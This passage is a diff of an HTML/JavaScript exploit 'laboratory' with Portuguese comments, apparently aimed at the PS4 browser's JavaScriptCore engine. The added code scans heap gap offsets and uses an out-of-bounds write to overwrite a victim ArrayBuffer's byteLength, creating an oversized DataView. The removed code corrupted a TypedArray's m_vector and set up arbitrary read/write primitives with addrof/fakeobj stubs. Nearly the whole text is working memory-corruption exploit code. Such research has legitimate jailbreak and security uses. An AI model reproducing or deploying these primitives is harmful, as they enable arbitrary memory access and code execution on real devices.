+                             log(`        ALVO ALCANÇÁVEL! byteLength (abs_dv ${target_bl_abs_offset_in_dv_num}) ESTÁ AO ALCANCE do oob_dataview_real!`, "vuln", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`);
+                             const new_size = new AdvancedInt64(0x7FFFFFCE, 0); 
+                             oob_write_relative(target_bl_abs_offset_in_dv_num - baseOffsetInBuffer, new_size.low(), 4);
+                             log(`        Escrita para corromper byteLength da VÍTIMA enviada (para abs_dv ${target_bl_abs_offset_in_dv_num}).`, "vuln", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`);
+                             try {
+                                 log(`        Tamanho atual victim_object.byteLength (JS): ${victim_object.byteLength}`, "info", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`);
+                                 iter_god_object_dataview = new DataView(victim_object); 
+                                 log(`        NOVO DataView (iter_god_object_dataview) criado sobre VÍTIMA. Novo tamanho (JS): ${iter_god_object_dataview.byteLength}`, "info", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`);
+                                 if (iter_god_object_dataview.byteLength >= 0x7FFFFFCE) { 
+                                     corruption_details.corrupted = true; 
+                                     corruption_details.final_log = `SUCESSO! byteLength corrompido com GAP ${current_gap_to_test}. Ponteiro interno: ${internal_struct_ptr.toString(true)}. Novo tamanho JS: ${iter_god_object_dataview.byteLength}.`;
+                                     log(corruption_details.final_log, "good", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`);
+                                 } else { 
+                                     corruption_details.final_log =`ByteLength (${iter_god_object_dataview.byteLength}) não corrompido como esperado com GAP ${current_gap_to_test}.`;
+                                     log(corruption_details.final_log, "error", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`);
+                                 }
+                             } catch(e) {
+                                 corruption_details.final_log = `ERRO ao usar VÍTIMA após corrupção com GAP ${current_gap_to_test}: ${e.message}`;
+                                 log(corruption_details.final_log, "error", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`);
+                             }
+                        } else {
+                            corruption_details.final_log = `ByteLength em ${byteLength_actual_abs_address.toString(true)} (abs_dv ${target_bl_abs_offset_in_dv_num}) FORA do alcance com GAP ${current_gap_to_test}.`;
+                            log(corruption_details.final_log, "warn", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`);
+                        }
                     } else { 
-                        log(`      FALHA ao ler ponteiro interno válido da VÍTIMA (lido: ${internal_struct_ptr ? internal_struct_ptr.toString(true) : "null/zero"}). Verifique o GAP, os offsets JSC e o posicionamento na HEAP com o DEPURADOR.`, "error", STAGE_CORRUPT_FNAME);
+                        corruption_details.final_log = `GAP ${current_gap_to_test}: Ponteiro interno lido foi lixo ou zero.`;
+                        // log(corruption_details.final_log, "info", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`); // Log menos verboso para falhas
                     }
-                } else if (victim_object_type === 'TypedArray') {
-                    log("   Alvo: `TypedArray.m_vector` da VÍTIMA.", "info", STAGE_CORRUPT_FNAME);
-                    const M_VECTOR_OFFSET_IN_VICTIM_JSCELL = JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
-                    const m_vector_field_rel_offset_from_oob_base = victim_jscell_rel_offset_from_oob_logical_start + M_VECTOR_OFFSET_IN_VICTIM_JSCELL;
-
-                    log(`      Alvejando m_vector da VÍTIMA em rel_offset_oob_base ${m_vector_field_rel_offset_from_oob_base} (abs_dv ${baseOffsetInBuffer + m_vector_field_rel_offset_from_oob_base})`, "subtest", STAGE_CORRUPT_FNAME);
-                    log(`      DEPURADOR: Verifique o que existe neste local antes da escrita.`, "critical", STAGE_CORRUPT_FNAME);
-                    
-                    const fake_data_pointer_val = new AdvancedInt64(0x43434343, 0x43430000); // Endereço de teste
-                    oob_write_relative(m_vector_field_rel_offset_from_oob_base, fake_data_pointer_val, 8);
-                    log(`      Escrita para corromper m_vector da VÍTIMA enviada. Valor: ${fake_data_pointer_val.toString(true)}`, "vuln", STAGE_CORRUPT_FNAME);
-                    log(`      DEPURADOR: Verifique se o campo m_vector da VÍTIMA (TypedArray) mudou!`, "critical", STAGE_CORRUPT_FNAME);
-                    log(`      Acessar victim_object[0] agora tentará ler de ${fake_data_pointer_val.toString(true)}.`, "critical", STAGE_CORRUPT_FNAME);
-                    god_object_typedarray = victim_object; 
-                    corruption_achieved = true; // Sucesso aparente; depurador confirma.
+                } else {
+                     corruption_details.final_log = "Tipo de vítima não é ArrayBuffer para esta tentativa.";
+                     log(corruption_details.final_log, "warn", `${ITER_CORRUPT_FNAME}::${FNAME_TRY}`);
                 }
-                return corruption_achieved;
+                return corruption_details;
             }
             
-            function setup_arbitrary_rw_primitives() { 
-                arbitrary_rw_ready = false;
-                if (god_object_dataview && victim_object && god_object_dataview.buffer === victim_object) { 
-                    arbitrary_rw_ready = true;
-                    god_object_data_base_address = AdvancedInt64.Zero; // Placeholder! PRECISA DO ENDEREÇO REAL DOS DADOS DA VÍTIMA (via addrof + leitura do ponteiro de dados)
-                    log(`Primitivas de R/W Arbitrário (VÍTIMA com byteLength corrompido) prontas (base dados: ${god_object_data_base_address.toString(true)} - AJUSTAR!).`, "good", STAGE_CORRUPT_FNAME);
-                } else if (god_object_typedarray && victim_object === god_object_typedarray) { 
-                    arbitrary_rw_ready = true;
-                    // Para TypedArray com m_vector controlado, o "endereço base" é o próprio m_vector.
-                    // A função read/write_arbitrary_address precisará reescrever o m_vector a cada chamada.
-                    log(`Primitivas de R/W Arbitrário (VÍTIMA TypedArray com m_vector controlado) prontas.`, "good", STAGE_CORRUPT_FNAME);
-                } else { log("ERRO: Nenhum god_object (da vítima) para R/W arbitrário.", "error", STAGE_CORRUPT_FNAME); }
-            }
+            async function findAndCorruptVictimMetadata_Iterative() {
+                log(`--- Iniciando ${ITER_CORRUPT_FNAME} ---`, 'test', ITER_CORRUPT_FNAME);
+                if (!victim_object) { log("ERRO: Vítima separada não alocada (Execute Passo 1).", "error", ITER_CORRUPT_FNAME); return; }
+                if (!oob_dataview_real) { log("ERRO: Primitiva OOB não ativa (Execute Passo 0).", "error", ITER_CORRUPT_FNAME); return; }
 
-            function read_arbitrary_address(address_adv64, num_bytes = 4) { /* ... como na v2.6.5 ... */
-                const FNAME_ARB_READ = "read_arbitrary_address";
-                if (!arbitrary_rw_ready) { log("R/W Arbitrário (vítima) não pronto.", "error", FNAME_ARB_READ); return null; }
-                if (!(address_adv64 instanceof AdvancedInt64)) address_adv64 = AdvancedInt64.fromNumber(address_adv64);
+                const gapStart = parseInt(document.getElementById('gapStartScan').value);
+                const gapEnd = parseInt(document.getElementById('gapEndScan').value);
+                const gapStep = parseInt(document.getElementById('gapStepScan').value);
 
-                if (god_object_dataview) { // Vítima era ArrayBuffer com byteLength corrompido
-                    if (!god_object_data_base_address) { log("Endereço base de dados do god_object (vítima AB) não conhecido.", "error", FNAME_ARB_READ); return null;}
-                    let offset_in_god_object_adv = address_adv64.sub(god_object_data_base_address);
-                    if (offset_in_god_object_adv.high() !== 0 && !(offset_in_god_object_adv.high() === -1 && offset_in_god_object_adv.low() < 0)) { log(`Offset ${offset_in_god_object_adv.toString(true)} muito grande para DataView.`, "error", FNAME_ARB_READ); return null; }
-                    let offset_in_god_object = offset_in_god_object_adv.low() >>> 0;
-                    log(`Lendo ${num_bytes}b de abs ${address_adv64.toString(true)} (offset ${toHexS1(offset_in_god_object)} no god_object_dataview da vítima)`, "subtest", FNAME_ARB_READ);
-                    if (offset_in_god_object < 0 || offset_in_god_object + num_bytes > god_object_dataview.byteLength) { log(`ERRO: Leitura arb. (vítima) fora dos limites (offset: ${toHexS1(offset_in_god_object)}, len: ${toHexS1(god_object_dataview.byteLength)})`, "error", FNAME_ARB_READ); return null;}
-                    try {
-                        switch (num_bytes) {
-                            case 1: return god_object_dataview.getUint8(offset_in_god_object);
-                            case 2: return god_object_dataview.getUint16(offset_in_god_object, true);
-                            case 4: return god_object_dataview.getUint32(offset_in_god_object, true);
-                            case 8: return new AdvancedInt64(god_object_dataview.getUint32(offset_in_god_object, true), god_object_dataview.getUint32(offset_in_god_object + 4, true));
-                            default: log("Tamanho inválido.", "error", FNAME_ARB_READ); return null;
-                        }
-                    } catch (e) { log(`Erro na leitura arb. (vítima): ${e.message}`, "error", FNAME_ARB_READ); return null;}
-                } else if (god_object_typedarray) { // Vítima era TypedArray com m_vector corrompido
-                    const victim_jscell_rel_offset_from_oob_logical_start = initialBufferSize + ASSUMED_GAP_BYTES_TO_VICTIM_JSCELL;
-                    const M_VECTOR_FIELD_REL_OFFSET = victim_jscell_rel_offset_from_oob_logical_start + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
-                    log(`   Definindo m_vector do god_object_typedarray para ${address_adv64.toString(true)} para leitura...`, "tool", FNAME_ARB_READ);
-                    oob_write_relative(M_VECTOR_FIELD_REL_OFFSET, address_adv64, 8); // Reescrever o m_vector para o endereço desejado
+                if (isNaN(gapStart) || isNaN(gapEnd) || isNaN(gapStep) || gapStep === 0) {
+                    log("ERRO: Configuração de faixa de GAP inválida.", "error", ITER_CORRUPT_FNAME); return;
+                }
+                log(`   Iniciando busca de GAP de ${gapStart} a ${gapEnd}, passo ${gapStep}.`, "info", ITER_CORRUPT_FNAME);
+                log(`   Isto pode causar CRASHES no navegador do PS4!`, "critical", ITER_CORRUPT_FNAME);
+                await PAUSE_LAB(1000); // Pausa para o usuário ler o aviso
+
+                let success = false;
+                for (let current_gap = gapStart; current_gap <= gapEnd; current_gap += gapStep) {
+                    log(`Testando GAP: ${current_gap}`, "test", ITER_CORRUPT_FNAME);
+                    document.getElementById('gapToVictim').value = current_gap; // Atualiza UI para refletir o GAP testado
+                    CURRENT_TEST_GAP = current_gap; // Atualiza global para try_corrupt_victim_with_gap
+
+                    const result = await try_corrupt_victim_with_gap(current_gap);
                     
-                    // Assumindo que god_object_typedarray é Uint32Array para este exemplo
-                    if (num_bytes === 4 && god_object_typedarray instanceof Uint32Array) {
-                         try { return god_object_typedarray[0]; } catch (e) { log(`Erro ao ler god_object_typedarray[0] @ ${address_adv64.toString(true)}: ${e.message}`, "error", FNAME_ARB_READ); return null;}
+                    if (result.ptr_read instanceof AdvancedInt64 && !result.ptr_read.toString(false).toLowerCase().includes("aaaa") && !result.ptr_read.eq(AdvancedInt64.Zero)) {
+                        log(`  Resultado para GAP ${current_gap}: Ponteiro Interno Lido: ${result.ptr_read.toString(true)}. ${result.corrupted ? "CORROMPIDO COM SUCESSO!" : "Não corrompido ou falha."}`, result.corrupted ? "good" : "warn", ITER_CORRUPT_FNAME);
+                    } else if (current_gap % (gapStep * 5) === 0) { // Log menos verboso para falhas
+                         log(`  Resultado para GAP ${current_gap}: Nenhum ponteiro interno válido lido.`, "info", ITER_CORRUPT_FNAME);
                     }
-                    log("Leitura arbitrária via god_object_typedarray (m_vector) parcialmente implementada.", "warn", FNAME_ARB_READ);
-                    return null;
-                }
-                return null;
-            }
-            // write_arbitrary_address similar...
-            async function addrof_placeholder(target_obj_name_str) { log(`addrof_placeholder para '${target_obj_name_str}' chamado (NÃO IMPLEMENTADO REALMENTE)`, "tool"); return AdvancedInt64.Zero;}
-            async function fakeobj_placeholder(address_adv64_to_point_to) { log(`fakeobj_placeholder para ${address_adv64_to_point_to.toString(true)} chamado (NÃO IMPLEMENTADO REALMENTE)`, "tool"); return null;}
 
-            async function runTargetedCorruptionAttempt() { 
-                log(`--- Iniciando ${STAGE_CORRUPT_FNAME} (VÍTIMA SEPARADA) ---`, 'test', STAGE_CORRUPT_FNAME);
-                let corruption_result = await attempt_corruption_on_victim(); 
-                if (corruption_result) {
-                    setup_arbitrary_rw_primitives(); 
-                    if (arbitrary_rw_ready) {
-                        log("--- Testando R/W Arbitrário (Vítima Corrompida) ---", "test", STAGE_CORRUPT_FNAME);
-                        if (oob_leaked_ptr_real && oob_leaked_ptr_real.value) { 
-                            log(`Tentando ler do endereço vazado no Passo 0: ${oob_leaked_ptr_real.value.toString(true)}`, "subtest", STAGE_CORRUPT_FNAME);
-                            let val = read_arbitrary_address(oob_leaked_ptr_real.value, 4);
-                            if (val !== null) { log(`Valor lido (vítima) de ${oob_leaked_ptr_real.value.toString(true)}: ${toHexS1(val)}`, "leak", STAGE_CORRUPT_FNAME); }
-                            else { log(`Falha ao ler (vítima) de ${oob_leaked_ptr_real.value.toString(true)}`, "error", STAGE_CORRUPT_FNAME); }
-                        } else { log("Nenhum oob_leaked_ptr_real para testar leitura arbitrária (vítima).", "info", STAGE_CORRUPT_FNAME); }
-                    } else { log("R/W Arbitrário (vítima) não pôde ser configurado.", "error", STAGE_CORRUPT_FNAME); }
+                    if (result.corrupted) {
+                        success = true;
+                        log(`SUCESSO! Corrupção alcançada com GAP = ${current_gap}. Detalhes acima.`, "critical", ITER_CORRUPT_FNAME);
+                        break; 
+                    }
+                    await PAUSE_LAB(100); // Pequena pausa entre tentativas para não sobrecarregar e permitir logs
+                    if (current_gap + gapStep > gapEnd && current_gap < gapEnd) { // Forçar teste do último valor se o passo não o alcançar exatamente
+                        current_gap = gapEnd - gapStep; // Para que o próximo loop seja o último
+                    }
                 }
-                log(`--- ${STAGE_CORRUPT_FNAME} (VÍTIMA SEPARADA) Concluído ---`, 'test', STAGE_CORRUPT_FNAME);
+
+                if (success) {
+                    // Tentar configurar e usar R/W arbitrário (lógica placeholder)
+                    // setup_arbitrary_rw_primitives(); // Precisaria do endereço base dos dados da vítima
+                    // if (arbitrary_rw_ready) { ... }
+                } else {
+                    log("Busca iterativa de GAP concluída. Nenhuma corrupção bem-sucedida confirmada pelo script.", "warn", ITER_CORRUPT_FNAME);
+                    log("Verifique os logs para 'ACHADO PONTEIRO INTERNO POTENCIAL' e use o depurador com esses GAPs.", "critical", ITER_CORRUPT_FNAME);
+                }
+                log(`--- ${ITER_CORRUPT_FNAME} Concluído ---`, 'test', ITER_CORRUPT_FNAME);
+            }
+            // Funções setup_arbitrary_rw_primitives, read_arbitrary_address, etc. (como na v2.6.6 - podem ser chamadas se a corrupção for bem sucedida)
+            function setup_arbitrary_rw_primitives() { /* ... como na v2.6.6 ... */  
+                arbitrary_rw_ready = false;
+                if (iter_god_object_dataview && victim_object && iter_god_object_dataview.buffer === victim_object) { 
+                    arbitrary_rw_ready = true;
+                    iter_god_object_data_base_address = AdvancedInt64.Zero; 
+                    log(`Primitivas de R/W Arbitrário (VÍTIMA com byteLength corrompido) prontas (base dados: ${iter_god_object_data_base_address.toString(true)} - AJUSTAR!).`, "good", ITER_CORRUPT_FNAME);
+                } else { log("ERRO: Nenhum god_object (da vítima) para R/W arbitrário.", "error", ITER_CORRUPT_FNAME); }
             }
         </script>
     </div>
     
     <script>
-        log("Laboratório (v2.6.6 - Depuração PS4) Carregado.", "good", "Init");
-        document.getElementById('gapToVictim').value = ASSUMED_GAP_BYTES_TO_VICTIM_JSCELL;
+        log("Laboratório (v2.6.8 - Busca Iterativa de GAP PS4) Carregado.", "good", "Init");
+        updateCurrentTestGap(); 
     </script>
 </body>
 </html>
